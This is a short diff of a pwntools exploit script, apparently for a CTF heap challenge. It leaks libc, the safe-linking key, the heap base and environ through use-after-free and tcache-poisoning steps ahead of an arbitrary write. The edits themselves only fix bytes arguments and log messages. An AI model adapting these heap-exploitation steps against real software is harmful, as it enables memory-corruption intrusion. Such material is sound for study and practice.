@@ -61,20 +61,20 @@ malloc(0x60,1)
 delete(0)
 malloc(0x500,0)
 view(0)
-io.recvuntil("note : ")
+io.recvuntil(b"note : ")
 libc_addr=u64(io.recvline(False).ljust(8,b"\x00"))
 libc_addr=libc_addr-0x21ace0
 libc.address=libc_addr
 success(f"LIBC LEAK@: {hex(libc.address)} ")
-#leka safe linking
+#lek heap and safe linking
 malloc(0x90,2)
 delete(2)
 malloc(0x90,2)
 view(2)
-io.recvuntil("note : ")
+io.recvuntil(b"note : ")
 key=u64(io.recvline(False).ljust(8,b"\x00"))
 heap_base = key<<12
-success(f"HEAP KEY LEAK@: {hex(key)} ")
+success(f"SAFE LINKING KEY LEAK@: {hex(key)} ")
 success(f"HEAP BASE LEAK@: {hex(heap_base)} ")
 delete(1)
 delete(2)
@@ -88,7 +88,7 @@ edit(3,b"A"*0x78+p64(0x81)+p64(libc.sym.environ^key))
 malloc(0x78,4)  
 malloc(0x78,5) 
 view(5)
-io.recvuntil("note : ")
+io.recvuntil(b"note : ")
 environ=u64(io.recvline(False).ljust(8,b"\x00"))
 success(f"ENVIRON LEAK@: {hex(environ)} ")
 #arb write
